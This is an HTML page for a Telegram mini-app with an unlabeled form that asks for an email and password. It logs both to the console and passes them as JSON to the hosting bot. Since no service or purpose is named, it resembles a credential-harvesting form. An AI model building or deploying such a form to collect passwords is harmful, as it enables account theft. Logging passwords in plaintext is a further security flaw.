<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>User Information</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      background-color: var(--tg-theme-bg-color, #f0f0f0);
      color: var(--tg-theme-text-color, #222);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
      transition: background-color 0.3s, color 0.3s;
    }

    .form-container {
      background-color: var(--tg-theme-secondary-bg-color, #ffffff);
      padding: 30px 40px;
      border-radius: 12px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 400px;
      text-align: center;
      transition: background-color 0.3s;
    }

    h2 {
      color: var(--tg-theme-text-color, #333);
      margin-bottom: 25px;
      font-size: 24px;
      font-weight: 600;
    }

    input[type="email"],
    input[type="password"] {
      display: block;
      width: 100%;
      padding: 15px;
      margin-bottom: 15px;
      font-size: 16px;
      border: 1px solid var(--tg-theme-hint-color, #ddd);
      border-radius: 8px;
      background-color: var(--tg-theme-bg-color, #f9f9f9);
      color: var(--tg-theme-text-color, #333);
      transition: border-color 0.3s, box-shadow 0.3s, background-color 0.3s, color 0.3s;
    }

    input::placeholder {
      color: var(--tg-theme-hint-color, #999);
    }

    input:focus {
      outline: none;
      border-color: var(--tg-theme-button-color, #007bff);
      box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.1);
    }

    button {
      display: block;
      width: 100%;
      padding: 15px;
      margin-top: 10px;
      font-size: 17px;
      font-weight: 600;
      color: var(--tg-theme-button-text-color, #ffffff);
      background-color: var(--tg-theme-button-color, #007bff);
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.3s, transform 0.1s;
    }

    button:hover {
      background-color: var(--tg-theme-button-color, #0056b3);
      filter: brightness(95%);
    }

    button:active {
      transform: scale(0.98);
    }
  </style>
</head>
<body>
  <div class="form-container">
    <h2>Enter Your Info</h2>
    <form id="user-form" onsubmit="submitForm(event)">
      <input type="email" id="email" placeholder="Email" required />
      <input type="password" id="password" placeholder="Password" required />
      <button type="submit">Submit</button>
    </form>
  </div>

  <script>
    Telegram.WebApp.ready();

    function submitForm(event) {
      if (event) {
        event.preventDefault();
      }

      const emailInput = document.getElementById("email");
      const passwordInput = document.getElementById("password");

      if (!emailInput.value.trim() || !passwordInput.value.trim()) {
        alert("Please fill in both fields.");
        return;
      }

      if (!emailInput.checkValidity()) {
        alert("Please enter a valid email address.");
        return;
      }

      const email = emailInput.value;
      const password = passwordInput.value;

      const data = { email, password };

      console.log("Sending data:", data);
      Telegram.WebApp.sendData(JSON.stringify(data));

      const submitButton = document.querySelector('#user-form button');
      submitButton.disabled = true;
      submitButton.textContent = 'Sending...';

      setTimeout(() => {
        Telegram.WebApp.close();
      }, 300);
    }
  </script>
</body>
</html>
